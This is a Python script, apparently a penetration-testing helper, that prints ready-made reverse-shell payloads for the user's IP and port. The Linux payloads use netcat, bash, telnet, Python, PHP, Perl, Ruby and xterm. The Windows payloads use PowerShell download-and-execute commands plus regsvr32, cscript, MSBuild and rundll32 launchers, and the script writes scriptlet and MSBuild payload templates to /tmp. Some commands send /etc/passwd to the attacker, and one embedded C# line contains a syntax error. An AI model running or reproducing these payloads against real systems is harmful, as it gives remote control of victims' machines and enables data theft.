#!/usr/bin/python3

import sys
import getopt
import netifaces as ni
import argparse
import base64

def getIP(interface):
    ni.ifaddresses(interface)
    ip = ni.ifaddresses(interface)[2][0]['addr']
    return ip

def netcat(ip,port):
    print("\033[32m### Netcat ###\033[0m\n")

    print("\033[38;5;208mVictim:\033[0m /bin/nc "+ip+" "+port+" -e /bin/bash")
    print("\033[38;5;208mAttacker:\033[0m nc -lvp "+port+"\n")

    print("\033[38;5;208mVictim:\033[0m cat /etc/passwd | /bin/nc "+ip+" "+port)
    print("\033[38;5;208mAttacker:\033[0m nc -lvp "+port+"\n")

    print("\033[38;5;208mVictim:\033[0m rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | /bin/nc "+ip+" "+port+" > /tmp/f")
    print("\033[38;5;208mAttacker:\033[0m nc -lvp "+port+"\n")

    print("\033[38;5;208mVictim:\033[0m rm -f /tmp/p; mknod /tmp/p p && cat /etc/passwd | /bin/nc "+ip+" "+port+" 0/tmp/p")
    print("\033[38;5;208mAttacker:\033[0m nc -lvp "+port+"\n")

    print("\033[38;5;208mVictim:\033[0m rm -f backpipe; mknod backpipe p && /bin/nc "+ip+" "+port+" 0<backpipe | /bin/bash 1>backpipe")
    print("\033[38;5;208mAttacker:\033[0m nc -lvp "+port+"\n")

def bash(ip,port):
    print("\033[32m### Bash ###\n\033[0m")

    print("\033[38;5;208mVictim:\033[0m /bin/bash -i >& /dev/tcp/"+ip+"/"+port+" 0>&1")
    print("\033[38;5;208mAttacker:\033[0m nc -lvp "+port+"\n")

    print("\033[38;5;208mVictim:\033[0m /bin/bash -i > /dev/tcp/"+ip+"/"+port+" 0<&1 2>&1")
    print("\033[38;5;208mAttacker:\033[0m nc -lvp "+port+"\n")

    print("\033[38;5;208mVictim:\033[0m 0<&196;exec 196<>/dev/tcp/"+ip+"/"+port+"; /bin/bash <&196 >&196 2>&196")
    print("\033[38;5;208mAttacker:\033[0m nc -lvp "+port+"\n")

    print("\033[38;5;208mVictim:\033[0m exec 5<>/dev/tcp/"+ip+"/"+port)
    print("\033[38;5;208mVictim:\033[0m cat <&5 | while read line; do $line 2>&5 >&5; done")
    print("\033[38;5;208mAttacker:\033[0m nc -lvp "+port+"\n")

    print("\033[38;5;208mVictim:\033[0m exec 5<>/dev/tcp/"+ip+"/"+port)
    print("\033[38;5;208mVictim:\033[0m while read line 0<&5; do $line 2>&5 >&5; done")
    print("\033[38;5;208mAttacker:\033[0m nc -lvp "+port+"\n")

def telnet(ip,port):
    print("\033[32m### Telnet ###\n\033[0m")

    print("\033[38;5;208mVictim:\033[0m telnet "+ip+" "+port+" | /bin/bash | telnet "+ip+" 8080")
    print("\033[38;5;208mAttacker:\033[0m nc -lvp 8080")
    print("\033[38;5;208mAttacker:\033[0m nc -lvp "+port+"\n")

    print("\033[38;5;208mVictim:\033[0m rm -f backpipe; mknod backpipe p && telnet "+ip+" "+port+" 0<backpipe | /bin/bash 1>backpipe")
    print("\033[38;5;208mAttacker:\033[0m nc -lvp "+port+"\n")

def python(ip,port):
    print("\033[32m### Python ###\n\033[0m")

    print("\033[38;5;208mVictim:\033[0m python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""+ip+"\","+port+"));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'")
    print("\033[38;5;208mAttacker:\033[0m nc -lvp "+port+"\n")

def php(ip,port):
    print("\033[32m### PHP ###\n\033[0m")

    print("\033[38;5;208mVictim:\033[0m php -r '$sock=fsockopen(\""+ip+"\","+port+");exec(\"/bin/bash -i <&3 >&3 2>&3\");'")
    print("\033[38;5;208mAttacker:\033[0m nc -lvp "+port+"\n")

def perl(ip,port):
    print("\033[32m### Perl ###\n\033[0m")

    print("\033[38;5;208mVictim:\033[0m perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,\""+ip+":"+port+"\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'")
    print("\033[38;5;208mAttacker:\033[0m nc -lvp "+port+"\n")

def ruby(ip,port):
    print("\033[32m### Ruby ###\n\033[0m")

    print("\033[38;5;208mVictim:\033[0m ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\""+ip+"\",\""+port+"\");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'")
    print("\033[38;5;208mAttacker:\033[0m nc -lvp "+port+"\n")

def xterm(ip,port):
    print("\033[32m### Xterm ###\n\033[0m")

    print("\033[38;5;208mVictim:\033[0m xterm -display "+ip+":1")
    print("\033[38;5;208mAttacker:\033[0m Xnest :1                   # to catch incoming xterm session")
    print("\033[38;5;208mAttacker:\033[0m xterm -display 127.0.0.1:1 # run this OUTSIDE Xnet")
    print("\033[38;5;208mAttacker:\033[0m xhost +VictimIP            # run this INSIDE Xnet\n")

def powershell(ip,port,file,proxy,creds):
    print("\033[32m### PowerShell ###\n\033[0m")
    if proxy :
        if creds :
            username = creds.split(":")[0]
            password = creds.split(":")[1]
            if len(username.split('\\')) > 1 :
                domain = username.split('\\')[0]
                username = username.split('\\')[1]
                wproxy = "$w = New-Object System.Net.WebClient; $w.proxy = New-Object System.Net.WebProxy('"+proxy+"'); $w.proxy.Credentials = New-Object System.Net.NetworkCredential('"+username+"','"+password+"','"+domain+"');"
            else:
                wproxy = "$w = New-Object System.Net.WebClient; $w.Proxy = New-Object System.Net.WebProxy('"+proxy+"'); $w.proxy.Credentials = New-Object System.Net.NetworkCredential('"+username+"','"+password+"');"
        else :
            wproxy = "$w = New-Object System.Net.WebClient; $w.Proxy = New-Object System.Net.WebProxy('"+proxy+"'); $w.Proxy.Credentials =[System.Net.CredentialCache]::DefaultNetworkCredentials;"
    else:
        wproxy = "$w = New-Object System.Net.WebClient;if([System.Net.WebProxy]::GetDefaultProxy().address -ne $null){$w.proxy=[Net.WebRequest]::GetSystemWebProxy();w.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;};"
    print("\033[94mDownload a file\033[0m")
    output = "[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};"+wproxy+"$w.DownloadFile(\'http://"+ip+":"+port+"/"+file+"\',\'"+file+"\')"
    print("\033[38;5;208mVictim:\033[0m powershell -nop -exec bypass -C "+output+"\n")
    print("\033[38;5;208mVictim:\033[0m powershell -nop -exec bypass -e " + base64.b64encode(output.encode('UTF-16LE')).decode() + "\n")
    
    print("\033[94mDownload a file in AppData\033[0m")
    output = "[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true}; iwr http://"+ip+":"+port+"/"+file+" -Outfile $env:APPDATA\\"+file
    print("\033[38;5;208mVictim:\033[0m powershell -nop -exec bypass "+output+"\n")
    print("\033[38;5;208mVictim:\033[0m powershell -nop -exec bypass -e " + base64.b64encode(output.encode('UTF-16LE')).decode() + "\n")
    
    print("\033[94mDownload and execute a file in %TEMP%\033[0m")
    output = "[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};"+wproxy+" $w.DownloadFile('http://"+ip+":"+port+"/"+file+"','%TEMP%\\"+file+"');.\%TEMP%\\"+file
    print("\033[38;5;208mVictim:\033[0m powershell -nop -exec bypass -C "+output+"\n")
    print("\033[38;5;208mVictim:\033[0m powershell -nop -exec bypass -e " + base64.b64encode(output.encode('UTF-16LE')).decode() + "\n")
    
    print("\033[94mExecute a .ps1 script\033[0m")
    output = "powershell -nop -exec bypass -C [System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};"+wproxy+" iex $w.DownloadString('http://"+ip+":"+port+"/"+file+"')"
    print("\033[38;5;208mVictim:\033[0m "+output+ "\n")
    print("\033[38;5;208mVictim:\033[0m powershell -nop -exec bypass -e " + base64.b64encode(output.encode('UTF-16LE')).decode() + "\n")

def regsvr32(ip,port,file,proxy):
    if not proxy :
        tmpfile= file+"_regsvr32.xml"
        print("\033[32m### Regsvr32 ###\n\033[0m")
        print("\033[38;5;208mVictim:\033[0m regsvr32 /s /n /u /i:http://"+ip+":"+port+"/"+tmpfile+" scrobj.dll")
        print("\033[38;5;208mTemplate Saved:\033[0m /tmp/"+tmpfile+"\n")
        with open("/tmp/"+tmpfile, 'a') as out :
            txt = """<?XML version="1.0"?>
<scriptlet>
<registration
description="Win32COMDebug"
progid="Win32COMDebug"
version="1.00"
classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}" >
 <script language="JScript">
      <![CDATA[
           var r = new ActiveXObject("WScript.Shell").Run('powershell -nop -exec bypass -C $w = New-Object System.Net.WebClient; $w.Proxy.Credentials =[System.Net.CredentialCache]::DefaultNetworkCredentials; iex $w.DownloadString("http://"""+ip+":"+port+"/"+file+"""")')
      ]]>
 </script>
</registration>
<public>
    <method name="Exec"></method>
</public>
</scriptlet>"""
            out.write(txt)

def cscript(ip,port,file,proxy):
    if not proxy :
        tmpfile = file+"_cscript.xml"
        print("\033[32m### cscript ###\n\033[0m")
        print("\033[38;5;208mVictim:\033[0m cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs printers\"script:http:://"+ip+":"+port+"/"+tmpfile+"\"")
        print("\033[38;5;208mTemplate Saved:\033[0m /tmp/"+tmpfile+"\n")
        with open("/tmp/"+tmpfile, 'a') as out :
            txt = """<sCrIptlEt><scRIPt>
a=new ActiveXObject("Shell.Application").ShellExecute("powershell.exe","powershell -nop -exec bypass -C $w = New-Object System.Net.WebClient; $w.Proxy.Credentials =[System.Net.CredentialCache]::DefaultNetworkCredentials; iex $w.DownloadString("http://"""+ip+":"+port+"/"+file+""""),"","open","0");
</scRIPt></sCrIptlEt>"""
            out.write(txt)

def msbuild(ip,port,file,proxy):
    if not proxy :
        tmpfile = file+"_msbuild.xml"
        print("\033[32m### MSBuild ###\n\033[0m")
        print("\033[38;5;208mVictim:\033[0m C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe "+tmpfile)
        print("\033[38;5;208mTemplate Saved:\033[0m /tmp/"+tmpfile+"\n")
        with open("/tmp/"+tmpfile, 'a') as out :
            txt = """<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="34rfas">
   <QWEridxnaPO />
  </Target>
    <UsingTask
    TaskName="QWEridxnaPO"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\\Windows\\Microsoft.Net\\Framework\\v4.0.30319\\Microsoft.Build.Tasks.v4.0.dll" >
    <Task>
      <Reference Include="System.Management.Automation" />
      <Code Type="Class" Language="cs">
        <![CDATA[       
            using System;
            using System.IO;
            using System.Diagnostics;
            using System.Reflection;
            using System.Runtime.InteropServices;
            using System.Collections.ObjectModel;
            using System.Management.Automation;
            using System.Management.Automation.Runspaces;
            using System.Text;
            using Microsoft.Build.Framework;
            using Microsoft.Build.Utilities;                            
            public class QWEridxnaPO :  Task, ITask {
                public override bool Execute() {
                    string poc = "$w = New-Object System.Net.WebClient; $w.Proxy.Credentials =[System.Net.CredentialCache]::DefaultNetworkCredentials; iex $w.DownloadString('http://"""+ip+":"+port+"/"+file+"""')";
                    Runspace runspace = RunspaceFactory.CreateRunspace();
                    runspace.Open();
                    RunspaceInvoke scriptInvoker = new RunspaceInvoke(runspace);
                    Pipeline pipeline = runspace.CreatePipeline();
                    pipeline.Commands.AddScript(poc;
                    pipeline.Invoke();
                    runspace.Close();           
                    return true;
                }                                
            }           
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>"""
            out.write(txt)

def rundll32(ip,port,file,proxy,creds):
    print("\033[32m### Rundll32 ###\n\033[0m")
    if proxy :
        if creds :
            username = creds.split(":")[0]
            password = creds.split(":")[1]
            if len(username.split('\\')) > 1 :
                domain = username.split('\\')[0]
                username = username.split('\\')[1]
                wproxy = "$w = New-Object System.Net.WebClient; $w.proxy = New-Object System.Net.WebProxy('"+proxy+"'); $w.proxy.Credentials = New-Object System.Net.NetworkCredential('"+username+"','"+password+"','"+domain+"');"
            else:
                wproxy = "$w = New-Object System.Net.WebClient; $w.Proxy = New-Object System.Net.WebProxy('"+proxy+"'); $w.proxy.Credentials = New-Object System.Net.NetworkCredential('"+username+"','"+password+"');"
        else :
            wproxy = "$w = New-Object System.Net.WebClient; $w.Proxy = New-Object System.Net.WebProxy('"+proxy+"'); $w.Proxy.Credentials =[System.Net.CredentialCache]::DefaultNetworkCredentials;"
    else:
        wproxy = "$w = New-Object System.Net.WebClient;"
    print("\033[38;5;208mVictim:\033[0m rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();new%20ActiveXObject(\"WScript.Shell\").Run(\"powershell -nop -exec bypass -C [System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};"+wproxy+" iex $w.DownloadString('http://"+ip+":"+port+"/"+file+"');\n")

def extra(ip,port,file):
    print("\033[32m### File Transfer ###\n\033[0m")
    print("\033[90mPython Webserver:\033[0m python -m SimpleHTTPServer "+port)
    print("\033[90mPHP Webserver:\033[0m php -S "+ip+":"+port+" -t .")
    print("\033[90mNC Server:\033[0m nc -s "+ip+" -lvp "+port+" < file")
    print("\033[38;5;208mVictim:\033[0m nc "+ip+" -p "+port+" > file")
    print("\033[90mFTP Webserver:\033[0m python -m pyftpdlib -i "+ip+" -p "+port)
    print("\033[38;5;208mVictim:\033[0m")
    print("echo open "+ip+" "+port+"> ftp.txt")
    print("echo anonymous>> ftp.txt")
    print("echo whatever>> ftp.txt")
    print("echo ls>> ftp.txt")
    print("echo passive>> ftp.txt")
    print("echo get "+file+" >> ftp.txt")
    print("echo bye >> ftp.txt")
    print("ftp -s:ftp.txt\n")
    print("\033[32m### Interactive TTY ###\n\033[0m")
    print("\033[38;5;208mVictim:\033[0m perl -e 'exec \"/bin/sh\";'\n")
    print("\033[38;5;208mVictim:\033[0m ruby ruby -e exec \"/bin/sh\"\n")
    print("\033[38;5;208mVictim:\033[0m python -c 'import pty; pty.spawn(\"/bin/bash\")'")
    print("\033[38;5;208mVictim:\033[0m Ctrl-Z")
    print("\033[38;5;208mAttacker:\033[0m stty raw -echo")
    print("\033[38;5;208mAttacker:\033[0m fg")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-i","--interface",help="Specify interface (Default eth0)")
    parser.add_argument("-a","--address",help="Specify IP address")
    parser.add_argument("-p","--port",help="Specify Port to listen (Default 80)",default="80")
    parser.add_argument("-f","--file",help="Specify file to download or execute (Default file)",default="file")
    parser.add_argument("-P","--proxy",help="Specify proxy settings ie: 127.0.0.1:8888 (Default None)",default=None)
    parser.add_argument("-c","--creds",help="Specify creds for proxy ie: [domain]\\username:password",default=None)
    parser.add_argument("-l","--linux",help="Print only linux payloads (Default false)", default=False, action='store_true')
    parser.add_argument("-w","--windows",help="Print only windows payloads (Default false)",default=False, action='store_true')
    args = parser.parse_args()
    if (args.interface is None):
        args.interface="eth0"
    if (args.address is None):
        try:
            args.address = getIP(args.interface)
        except KeyError:
            print("Interface "+args.interface+" is without an IP address")
            sys.exit(1)
    print("Address: "+ args.address + " Port:"+args.port+"\n")
    if (args.linux):
        print("\033[93m### Linux Payloads ###\033[0m")
        netcat(args.address,args.port);bash(args.address,args.port);
        telnet(args.address,args.port);python(args.address,args.port);
        php(args.address,args.port);perl(args.address,args.port);
        ruby(args.address,args.port);xterm(args.address,args.port);
    elif (args.windows):
        print("\033[93m### Windows Payloads ###\033[0m")
        powershell(args.address,args.port,args.file,args.proxy,args.creds)
        regsvr32(args.address,args.port,args.file,args.proxy)
        cscript(args.address,args.port,args.file,args.proxy)
        msbuild(args.address,args.port,args.file,args.proxy)
        rundll32(args.address,args.port,args.file,args.proxy,args.creds)
    else:
        print("\033[93m### Linux Payloads ###\033[0m")
        netcat(args.address,args.port);bash(args.address,args.port);
        telnet(args.address,args.port);python(args.address,args.port);
        php(args.address,args.port);perl(args.address,args.port);
        ruby(args.address,args.port);xterm(args.address,args.port);
        print("\033[93m### Windows Payloads ###\033[0m")
        powershell(args.address,args.port,args.file,args.proxy,args.creds)
        regsvr32(args.address,args.port,args.file,args.proxy)
        cscript(args.address,args.port,args.file,args.proxy)
        msbuild(args.address,args.port,args.file,args.proxy)
        rundll32(args.address,args.port,args.file,args.proxy,args.creds)

    print("\033[93m### Extras ###\033[0m")
    extra(args.address,args.port,args.file)
    print("\n\033[31mHappy reverse shell :)\033[0m")
    sys.exit(0)
